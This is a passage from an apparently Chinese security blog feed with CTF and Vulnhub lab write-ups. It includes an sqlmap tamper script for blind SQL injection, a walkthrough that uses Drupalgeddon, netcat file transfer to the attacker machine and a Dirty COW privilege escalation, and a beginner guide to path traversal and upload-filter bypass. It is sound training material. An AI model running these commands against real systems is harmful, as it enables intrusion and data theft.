(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) &#123;</span><br><span class="line">        $list = explode(&apos;,&apos;, $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);</span><br><span class="line">        $ip = $list[0];</span><br><span class="line">    &#125;</span><br><span class="line">    if (!ip2long($ip)) &#123;</span><br><span class="line">        $ip = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现虽然可以用xff，但是有ip2long的验证，这条路不通。</p><p>我们发现在用cookie做身份校验的时候查询了数据库</p><p>发现其中用了json_decode，那么我们可以尝试使用编码进行bypass<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.replace(&apos;u&apos;, &apos;u0075&apos;)</span><br><span class="line">payload = payload.replace(&apos;o&apos;, &apos;u006f&apos;)</span><br><span class="line">payload = payload.replace(&apos;i&apos;, &apos;u0069&apos;)</span><br><span class="line">payload = payload.replace(&apos;&apos;&apos;, &apos;u0027&apos;)</span><br><span class="line">payload = payload.replace(&apos;&quot;&apos;, &apos;u0022&apos;)</span><br><span class="line">payload = payload.replace(&apos; &apos;, &apos;u0020&apos;)</span><br><span class="line">payload = payload.replace(&apos;s&apos;, &apos;u0073&apos;)</span><br><span class="line">payload = payload.replace(&apos;#&apos;, &apos;u0023&apos;)</span><br><span class="line">payload = payload.replace(&apos;&gt;&apos;, &apos;u003e&apos;)</span><br><span class="line">payload = payload.replace(&apos;&lt;&apos;, &apos;u003c&apos;)</span><br><span class="line">payload = payload.replace(&apos;-&apos;, &apos;u002d&apos;)</span><br><span class="line">payload = payload.replace(&apos;=&apos;, &apos;u003d&apos;)</span><br></pre></td></tr></table></figure></p><p>打开神器sqlmap，编写一下tamper：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    data = &apos;&apos;&apos;&#123;&quot;admin_user&quot;:&quot;admin%s&quot;,&quot;admin_pass&quot;:65&#125;;&apos;&apos;&apos;</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(&apos;u&apos;, &apos;u0075&apos;)</span><br><span class="line">    payload = payload.replace(&apos;o&apos;, &apos;u006f&apos;)</span><br><span class="line">    payload = payload.replace(&apos;i&apos;, &apos;u0069&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&apos;&apos;, &apos;u0027&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&quot;&apos;, &apos;u0022&apos;)</span><br><span class="line">    payload = payload.replace(&apos; &apos;, &apos;u0020&apos;)</span><br><span class="line">    payload = payload.replace(&apos;s&apos;, &apos;u0073&apos;)</span><br><span class="line">    payload = payload.replace(&apos;#&apos;, &apos;u0023&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&gt;&apos;, &apos;u003e&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&lt;&apos;, &apos;u003c&apos;)</span><br><span class="line">    payload = payload.replace(&apos;-&apos;, &apos;u002d&apos;)</span><br><span class="line">    payload = payload.replace(&apos;=&apos;, &apos;u003d&apos;)</span><br><span class="line">    return data % payload</span><br></pre></td></tr></table></figure></p><p>–technique=B指定bool盲注<br>sqlmap告诉我们没有漏洞，原因肯定是sqlmap对回显识别有问题<br>所以我们尝试指定错误时候的回显</p><p>–not-string=window.location<br>python  sqlmap.py -r C:\Users\林峰\Desktop\1.txt –tamper=hctf –dbms=mysql –thread=10 –technique=B –not-string=”window.location” -v3 -D hctf_kouzone -T F1444g -C F1a9 –dump</p><p>flag:</p><p>hctf{4526a8cbd741b3f790f95ad32c2514b9}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;hide-and-seek&quot;&gt;&lt;a href=&quot;#hide-and-seek&quot; class=&quot;headerlink&quot; title=&quot;hide and seek&quot;&gt;&lt;/a&gt;hide and seek&lt;/h1&gt;&lt;p&gt;再随便输一个非 admin 的用户名即可进入后台，提
      
    
    </summary>
    
      <category term="比赛" scheme="http://yoursite.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>vulnhub|渗透测试lampiao</title>
    <link href="http://yoursite.com/2018/09/01/lampiao/"/>
    <id>http://yoursite.com/2018/09/01/lampiao/</id>
    <published>2018-08-31T17:46:13.194Z</published>
    <updated>2018-08-31T19:14:53.147Z</updated>
    
    <content type="html"><![CDATA[<p>该文已先在先知社区发表：原文地址：<a href="https://xz.aliyun.com/t/2552" target="_blank" rel="noopener">https://xz.aliyun.com/t/2552</a></p><p>#vulnhub|渗透测试lampiao</p><p>##题记</p><p>最近在打靶机，发现了一个挺有意思的靶机，这里想跟大家分享一下.</p><p>##环境准备<br>vulnhub最近出的一台靶机</p><p><a href="https://www.vulnhub.com/entry/lampiao-1,249/" target="_blank" rel="noopener">靶机</a><br>Lampiao.zip (Size: 669 MB)</p><p>Download: <a href="https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM" target="_blank" rel="noopener">https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM</a></p><p>Download (Mirror): <a href="https://download.vulnhub.com/lampiao/Lampiao.zip" target="_blank" rel="noopener">https://download.vulnhub.com/lampiao/Lampiao.zip</a></p><p>Download (Torrent): <a href="https://download.vulnhub.com/lampiao/Lampiao.zip.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/lampiao/Lampiao.zip.torrent     ( Magnet)</a></p><p>攻击机 Kali IP 10.10.10.128</p><p>靶机在同一C段下 IP 10.10.10.129</p><p>##主机发现</p><p>使用命令<code>nmap -sP 192.168.107.1/24</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110334-22a369f4-9d13-1.png" alt=""></p><p>起始Ip 10.10.10.1，攻击机的ip是10.10.10.128，而10.10.10.254是结束ip。因为环境配置为dhcp动态分布，所以说我们的靶机ip就是10.10.10.129</p><p>##端口扫描<br>我们需要知道目标机器上开了哪些端口，运行了哪些服务，利用某些服务的漏洞来进行攻击，所以我们先进行端口扫描。</p><p>之前用nmap -sS 只扫出来个22端口，于是尝试ssh弱口令爆破，未果，</p><p>利用题目信息生成字典，未果，访问网站，发现如下是个静态页面什么也没有。文件头，源代码中无有效信息。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110334-22c3c29e-9d13-1.png" alt=""></p><p>后来反应过来，有可能网站还有其它端口可以访问，因为-sS参数是扫描常用的1000以内的端口号。于是用-p-参数：<code>nmap -p-  10.10.10.129</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110334-22d8658c-9d13-1.png" alt=""></p><p>扫出1898端口，于是访问，发现是个web服务端口：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110335-230cc444-9d13-1.png" alt=""></p><p>大致对网站浏览下，查找下功能点。主要是进行信息收集</p><p>##目录扫描<br>信息收集中非常重要的一步。这里我使用御剑扫描，可以看到，扫出来了robots.txt</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110335-2328cfcc-9d13-1.png" alt=""></p><p>于是访问robots.txt</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110335-235b9e70-9d13-1.png" alt=""></p><p>发现敏感文件/CHANGELOG.txt，一个记录更新的日志，访问发现是Drupal为框架的网站，最近一次更新为7.54</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110336-2384e49c-9d13-1.png" alt=""></p><p>##获取会话</p><p>其它目录暂无发现有用信息，搜集到大致的敏感信息后于是搜索其对应的漏洞利用，推荐使用msf，非常全面，而且方便，使用前记得<code>msfdb start</code>启动其连接的数据库，这样查找速度会很快</p><p>ps(kali默认是2.0版本也就是16年的，建议搜索前保证kali是最新版,漏洞才更全。现在用的是rolling更新源了。其他的源的话更新会报错。<a href="https://blog.csdn.net/xuqi7/article/details/71430349" target="_blank" rel="noopener">kali rolling 修改更新源</a></p><p>msf启动后，search drupal搜索其存在的对应漏洞，发现如下。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110336-23a873b2-9d13-1.png" alt=""></p><p>使用2018年这个漏洞。Drupal 在3月28日爆出的一个远程代码执行漏洞，CVE编号CVE-2018-7600。分析及 PoC 构造：<br><a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">推荐连接</a></p><p>我们直接利用，设置好目标主机10.10.10.129，目标端口号1898，查看以及设置目标操作系统类型，然后run执行，可以看到获取到了一个会话</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110336-23fee4d6-9d13-1.png" alt=""></p><p>执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-241706d8-9d13-1.png" alt=""></p><p>##寻找突破口</p><p>果不其然是www-data用户，说明需要提权，ls -al查看网站根目录有些什么东西发现有几个东西不是网站根目录应该有的，所以应该可以获得什么重要信息，所以把这些文件传输到攻击机上一一查看</p><ol><li>先在攻击机上使用命令<code>nc =-lvp 1234&gt;接受的文件名</code>准备接收文件</li><li>在靶机使用<code>nc -w 3 10.10.10.12&lt;要传输的文件名</code>传输文件</li></ol><p>在攻击机中打开，audio.m4a，lampiao.jpg，LuizGonzaga-LampiaoFalou.mp3，qrc.png如下发现</p><ol><li><p>qrc.png：一个二维码，扫出来的结果是 Try harger! muahuahuahua，被作者鼓励了。。</p></li><li><p>audio.m4a：提示为user tiago，说明要先找到用户tiago的密码</p></li><li><p>uizGonzaga-LampiaoFalou.mp3：一首音乐，丢入隐写工具没发现什么异常</p></li><li><p>lampiao.jpg：一张牛仔的图片，丢入binwlak中未发现有什么隐写</p></li></ol><p>继续翻目录，找文件，在var/www/html/sites/default目录下找到配置文件settings.php，发现敏感信息，tiago以及密码，很有可能就是其系统用户tiago的密码</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-242a62fa-9d13-1.png" alt=""></p><p>##获取普通用户权限</p><p>尝试登陆tiago用户，发现成功了。获取tiago用户的权限，根据提示及题目背景，发现tiago和lampiao很有些关系，那首音乐又提示说tiago。<br>然后试了试mysql数据库root的密码，结果密码也是tiago的登陆密码，成功获取Mysql数据库的root权限。我想tiago的提示也许就是这个意思吧</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-24421576-9d13-1.png" alt=""></p><p>在Mysql数据库中发现有drupal数据库，网站所有用户的信息就在这里了。这应该就是tiago这个用户最大的用处了吧，</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-245908e4-9d13-1.png" alt=""></p><p>##尝试爆破root密码</p><p>获得普通用户的权限后，接下来的一步就是提权到最高的root权限了。通过前面收集的所有信息生成社工字典，ssh爆破，未成功，</p><p>使用cewl<br>一个通过爬取网站上关键信息生成字典的一个神器，命令<code>cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt</code>，爆破ssh未果</p><p>##内核提权：</p><p><code>uname -a</code>查看当前内核版本：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-246baf9e-9d13-1.png" alt=""></p><p>这里需要去网上搜适合的exp了。推荐使用kali自带的searchsploit<br>,非常全面，方便，当然也可以去网上搜，</p><p>这里我们利用的是CVE-2016-5195：脏牛(Dirty Cow)漏洞-Linux一个内核本地提权漏洞 ，黑客通过远程入侵获取低权限用户后，利用该漏洞在全版本Linux系统服务器上实现本地提权，从而获取到服务器root权限。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-248dccd2-9d13-1.png" alt=""></p><p>漏洞影响范围：Linux Kernel &gt;= 2.6.22 的所有 Linux 系统</p><p>意味着从 2007 年发布 2.6.22 版本开始，直到2016年10月18日为止，这中间发行的所有 Linux 系统都受影响。而我们的靶机为ubuntu14.04.5更新时间为16年-8月-05所以存在漏洞</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-249d2eb6-9d13-1.png" alt=""></p><p><a href="https://help.aliyun.com/knowledge_detail/44786.html" target="_blank" rel="noopener">漏洞通过及修复</a></p><p>使用wget命令，下载提权exp到靶机：<code>wget https://www.exploit-db.com/download/40847.cpp</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110338-24ba10c6-9d13-1.png" alt=""></p><p>c++格式的文件，先编译，编译命令<code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</code></p><ol><li><p>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</p></li><li><p>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告</p></li><li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li><li>-std=c++11就是用按C++2011标准来编译的</li><li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li><li>-o dcow gcc生成的目标文件,名字为dcow</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110338-24c89f7e-9d13-1.png" alt=""></p><p><code>./dcow -s</code> 执行。提权成功</p><p>目标机上如果没有编译环境，这时候，我们可以本地搭建和目标机一样的环境，在本地编译好提权exp后，在目标机器上运行即可</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110338-24dd8da8-9d13-1.png" alt=""></p><p>##Get flag</p><p>flag肯定在root目录下。所以cd到root然后看到flag.txt ，cat查看一下。得到flag,通关。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110338-24fa6afe-9d13-1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;该文已先在先知社区发表：原文地址：&lt;a href=&quot;https://xz.aliyun.com/t/2552&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/2552&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;#vulnhub|渗
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>ctf入门总结</title>
    <link href="http://yoursite.com/2018/08/31/ctf%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2018/08/31/ctf入门总结/</id>
    <published>2018-08-31T07:26:00.000Z</published>
    <updated>2018-08-31T07:53:55.854Z</updated>
    
    <content type="html"><![CDATA[<p>下面中实验室指的是网络安全实验室</p><p>题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些，</p><p>文中所有知识点内容并不全，要学习<strong>原理</strong>及<strong>深入</strong>得自己去找资源学习，自学与搜集信息的能力是必不可少的</p><p>入门推荐书籍(必看):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》</p><h2 id="什么是CTF？"><a href="#什么是CTF？" class="headerlink" title="什么是CTF？"></a>什么是CTF？</h2><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式CTF比赛通常包含的题目类型包括MISC、PPC、CRYPTO、PWN、REVERSE、WEB、STEGA</p><h2 id="1-养成看源代码的习惯-简单"><a href="#1-养成看源代码的习惯-简单" class="headerlink" title="1.养成看源代码的习惯(简单)"></a>1.养成看源代码的习惯(简单)</h2><h3 id="flag在源代码中-："><a href="#flag在源代码中-：" class="headerlink" title="flag在源代码中()："></a>flag在源代码中()：</h3><p><a href="http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php" target="_blank" rel="noopener">题目</a></p><h3 id="firebug修改源码绕过本地验证"><a href="#firebug修改源码绕过本地验证" class="headerlink" title="firebug修改源码绕过本地验证"></a>firebug修改源码绕过本地验证</h3><p><a href="http://120.24.86.145:8002/yanzhengma/" target="_blank" rel="noopener">题目</a></p><p><a href="https://blog.csdn.net/weixin_40980428/article/details/79658665" target="_blank" rel="noopener">答案</a></p><h3 id="CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯"><a href="#CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯" class="headerlink" title="CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯"></a>CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯</h3><p>ctrl加F通用的搜索快捷键。</p><h3 id="这个题真是全程看源代码，快捷方式：F12"><a href="#这个题真是全程看源代码，快捷方式：F12" class="headerlink" title="这个题真是全程看源代码，快捷方式：F12"></a>这个题真是全程看源代码，快捷方式：F12</h3><p><a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="noopener">题目</a></p><p><a href="https://blog.csdn.net/include_heqile/article/details/80301934" target="_blank" rel="noopener">答案</a></p><h2 id="http头"><a href="#http头" class="headerlink" title="http头():"></a>http头():</h2><p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter2.html" target="_blank" rel="noopener">burpsuite,浏览器代理设置教程</a>抓了包后右键放到repeater里，点go可以进行发包测试，用完Burpsuite过后，要正常上网的话，要把代理关了。</p><h3 id="找flag-在请求头，响应头尝试实验室：key究竟在哪里呢？"><a href="#找flag-在请求头，响应头尝试实验室：key究竟在哪里呢？" class="headerlink" title="找flag:在请求头，响应头尝试实验室：key究竟在哪里呢？"></a>找flag:在请求头，响应头尝试<a href="http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php" target="_blank" rel="noopener">实验室：key究竟在哪里呢？</a></h3><h3 id="302跳转的中转网页，burp抓包在HTTP-history中找本应该访问的网站链接-为了方便寻找可以先clear一下历史-简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag"><a href="#302跳转的中转网页，burp抓包在HTTP-history中找本应该访问的网站链接-为了方便寻找可以先clear一下历史-简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag" class="headerlink" title="302跳转的中转网页，burp抓包在HTTP history中找本应该访问的网站链接(为了方便寻找可以先clear一下历史),简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag"></a>302跳转的中转网页，<strong>burp</strong>抓包在HTTP history中找本应该访问的网站链接(为了方便寻找可以先clear一下历史),简单方法用firefox右键查看元素的查看网络中找到302跳转的网页，寻找flag</h3><p><a href="http://chinalover.sinaapp.com/web9/" target="_blank" rel="noopener">南邮：单身一百年也没用</a></p><h3 id="如果题目中遇到只能某某ip才能访问-ip伪造-，修改或添加http请求头的X-Forwarded-For为题目允许的Ip地址-实验室：本地的诱惑"><a href="#如果题目中遇到只能某某ip才能访问-ip伪造-，修改或添加http请求头的X-Forwarded-For为题目允许的Ip地址-实验室：本地的诱惑" class="headerlink" title="如果题目中遇到只能某某ip才能访问(ip伪造)，修改或添加http请求头的X-Forwarded-For为题目允许的Ip地址,实验室：本地的诱惑"></a>如果题目中遇到只能某某ip才能访问(ip伪造)，修改或添加http请求头的<strong>X-Forwarded-For</strong>为题目允许的Ip地址,<a href="http://lab1.xseclab.com/base11_0f8e35973f552d69a02047694c27a8c9/index.php" target="_blank" rel="noopener">实验室：本地的诱惑</a></h3><h3 id="题目中说为了外国人的话：确保Accept-Language中有en-US-没有就自己加，如果说了只为了的话，就删掉其它的语言类型。"><a href="#题目中说为了外国人的话：确保Accept-Language中有en-US-没有就自己加，如果说了只为了的话，就删掉其它的语言类型。" class="headerlink" title="题目中说为了外国人的话：确保Accept-Language中有en-US  没有就自己加，如果说了只为了的话，就删掉其它的语言类型。"></a>题目中说为了外国人的话：确保<strong>Accept-Language</strong>中有en-US  没有就自己加，如果说了只为了的话，就删掉其它的语言类型。</h3><p><a href="http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php" target="_blank" rel="noopener">实验室：种族歧视</a></p><h3 id="只能用某种浏览器访问，直接修改user-agent为对应浏览器名字"><a href="#只能用某种浏览器访问，直接修改user-agent为对应浏览器名字" class="headerlink" title="只能用某种浏览器访问，直接修改user-agent为对应浏览器名字"></a>只能用某种浏览器访问，直接修改<strong>user-agent</strong>为对应浏览器名字</h3><p><a href="http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php" target="_blank" rel="noopener">实验室：HAHA浏览器</a></p><h3 id="Cookie的修改"><a href="#Cookie的修改" class="headerlink" title="Cookie的修改"></a><strong>Cookie</strong>的修改</h3><p><a href="http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php" target="_blank" rel="noopener">实验室：冒充登陆用户</a></p><h3 id="Referer来源伪造"><a href="#Referer来源伪造" class="headerlink" title="Referer来源伪造"></a>Referer来源伪造</h3><p><a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="noopener">题目</a>这个题好像坏了，可以去看下wp。</p><p><a href="https://blog.csdn.net/qq_39629343/article/details/80697107" target="_blank" rel="noopener">答案</a></p><p> <strong>最后来一个综合的题考察下你学的怎么样</strong><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="noopener">实验吧：头有点大</a></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>利用：</p><h3 id="读取敏感文件：如直接-etc-passwd来读取本地文件内容，其他敏感文件的读取是类似的"><a href="#读取敏感文件：如直接-etc-passwd来读取本地文件内容，其他敏感文件的读取是类似的" class="headerlink" title="读取敏感文件：如直接../../../../../etc/passwd来读取本地文件内容，其他敏感文件的读取是类似的"></a>读取敏感文件：如直接../../../../../etc/passwd来读取本地文件内容，其他敏感文件的读取是类似的</h3><h3 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h3><h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><h3 id="使用PHP封装协议读取文件和写入PHP文件"><a href="#使用PHP封装协议读取文件和写入PHP文件" class="headerlink" title="使用PHP封装协议读取文件和写入PHP文件"></a>使用PHP封装协议读取文件和写入PHP文件</h3><h3 id="配合文件上传漏洞："><a href="#配合文件上传漏洞：" class="headerlink" title="配合文件上传漏洞："></a>配合文件上传漏洞：</h3><p><strong>文件包含建议理解并操作dvwa的前三个难度的这个漏洞</strong><br><strong><br>例题：1.看到url里有?file=xxx.php(文件名)</strong></p><p>考虑php伪协议读取<strong>源码</strong>，</p><p>然后利用这一点，可以读取到你想获取的页面的源码例如：</p><p>index.php，flag.php，login.php的源码,然后base64解密</p><p>url里?后面改成这个?file=php://filter/read=convert.base64-encode/resource=index.php</p><p>本句的意思是将Index.php的源码以base64加密后的形式读出来</p><p><a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">南邮：文件包含</a></p><h2 id="暴力破解：burpsuite暴力破解教程"><a href="#暴力破解：burpsuite暴力破解教程" class="headerlink" title="暴力破解：burpsuite暴力破解教程"></a>暴力破解：<a href="https://t0data.gitbooks.io/burpsuite/content/chapter8.html" target="_blank" rel="noopener">burpsuite暴力破解教程</a></h2><p><a href="http://120.24.86.145:8002/baopo/" target="_blank" rel="noopener">bugku:输入密码查看flag</a></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p> <strong>例：只能传jpg等不能传php</strong></p><h3 id="查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用-JavaScript就可以上传php文件了，"><a href="#查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用-JavaScript就可以上传php文件了，" class="headerlink" title="查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用        JavaScript就可以上传php文件了，"></a>查看网页源码，很清楚看到是前端JS控制的话，那么直接禁用        JavaScript就可以上传php文件了，</h3><h3 id="或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php"><a href="#或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php" class="headerlink" title="或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php"></a>或者可以用burpsuite通过拦截数据包，修改filenmae后文件名后缀为php</h3><h3 id="1-jpg-php"><a href="#1-jpg-php" class="headerlink" title="1.jpg.php"></a>1.jpg.php</h3><h3 id="1-php-00-jpg"><a href="#1-php-00-jpg" class="headerlink" title="1.php%00.jpg"></a>1.php%00.jpg</h3><h3 id="1-php-jpg"><a href="#1-php-jpg" class="headerlink" title="1.php;.jpg"></a>1.php;.jpg</h3><h3 id="后缀名修改为php2-php3-php4-php5-phps-pht-phtm-phtml（php的别名）"><a href="#后缀名修改为php2-php3-php4-php5-phps-pht-phtm-phtml（php的别名）" class="headerlink" title="后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名）"></a>后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名）</h3><h3 id="抓包修改Content-Type里的multipart-form-data为Multipart-form-data（大小写绕过）"><a href="#抓包修改Content-Type里的multipart-form-data为Multipart-form-data（大小写绕过）" class="headerlink" title="抓包修改Content_Type里的multipart/form-data为Multipart/form-data（大小写绕过）"></a>抓包修改Content_Type里的multipart/form-data为Multipart/form-data（大小写绕过）</h3><p><a href="http://120.24.86.145:8002/web9/" target="_blank" rel="noopener">bugku:求getshell</a></p><h3 id="上传过后通过显示的路径进行访问，或者右键文件属性里查找。"><a href="#上传过后通过显示的路径进行访问，或者右键文件属性里查找。" class="headerlink" title="上传过后通过显示的路径进行访问，或者右键文件属性里查找。"></a>上传过后通过显示的路径进行访问，或者右键文件属性里查找。</h3><h3 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h3><p><a href="http://118.89.219.210:49166/index.php?file=hello.php" target="_blank" rel="noopener">bugku:文件包含2</a></p><p><a href="https://blog.csdn.net/qq_33417843/article/details/79756682" target="_blank" rel="noopener">答案</a>该题因为结合了上传，所以可以上传一句话木马，然后用菜刀连接</p><p> <strong>文件上传建议理解并操作dvwa的四个难度的这个漏洞</strong></p><h2 id="备份文件类型的-不难"><a href="#备份文件类型的-不难" class="headerlink" title="备份文件类型的(不难)"></a>备份文件类型的(不难)</h2><p>一看到<strong>备份</strong>这两个字就猜到是有文件没有删除，所以加上后缀如.swp .bak .swn .swo测试下 发现是index.php.bak 然后下载文件</p><p><a href="http://120.24.86.145:8002/web16/" target="_blank" rel="noopener">bugku备份是个好习惯</a></p><p><a href="https://blog.csdn.net/qq_40424939/article/details/80646055" target="_blank" rel="noopener">答案</a>该目录可以用御剑扫出来</p><ol><li><p>.bak ：index.php.bak  flag.php.bak等等</p></li><li><p>index.php.swp  index.php.swo    index.vim等等</p></li><li><p>flag.php.swp   flag.php.swo    flag.vim等等</p></li></ol><p>源代码中如果有<meta name="editor" content="Vim">发现是通过vim编写的，一般的vim编写可能会产生遗留问题，就是一个备份文件.swp</p><h2 id="JS类"><a href="#JS类" class="headerlink" title="JS类"></a>JS类</h2><p>尝试禁用js绕过：<a href="http://120.24.86.145:9001/test/" target="_blank" rel="noopener">bugku点击一百万次</a>或者</p><p><a href="https://blog.csdn.net/warmjuhao/article/details/78669230" target="_blank" rel="noopener">此题的另一种解法</a></p><h3 id="js自动刷新"><a href="#js自动刷新" class="headerlink" title="js自动刷新"></a>js自动刷新</h3><p><a href="http://120.24.86.145:8002/web12/" target="_blank" rel="noopener">题目</a></p><p><a href="https://blog.csdn.net/qq_35191331/article/details/77141413" target="_blank" rel="noopener">答案</a></p><h3 id="JS跳转："><a href="#JS跳转：" class="headerlink" title="JS跳转："></a>JS跳转：</h3><p>window.location=”跳转的目标url”;</p><p><a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">南邮：单身二十年</a></p><h3 id="js加解密"><a href="#js加解密" class="headerlink" title="js加解密"></a>js加解密</h3><p>直接复制粘贴到在F12控制台就出来了</p><h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode:"></a>AAencode:</h3><p><a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="noopener">南邮:AAencode</a></p><h3 id="JSFUCK"><a href="#JSFUCK" class="headerlink" title="JSFUCK:"></a>JSFUCK:</h3><p><a href="http://120.24.86.145:8002/web5/" target="_blank" rel="noopener">题目</a></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>反射型，储存型，dom型</p><p><a href="https://blog.csdn.net/u011781521/article/details/53894399" target="_blank" rel="noopener">学习资料，讲的通俗易懂</a></p><p><a href="http://103.238.227.13:10089/" target="_blank" rel="noopener">bugku:xss</a></p><p><a href="https://xss.haozi.me/#/0x03" target="_blank" rel="noopener">xss靶场</a></p><h2 id="常见的编码要掌握"><a href="#常见的编码要掌握" class="headerlink" 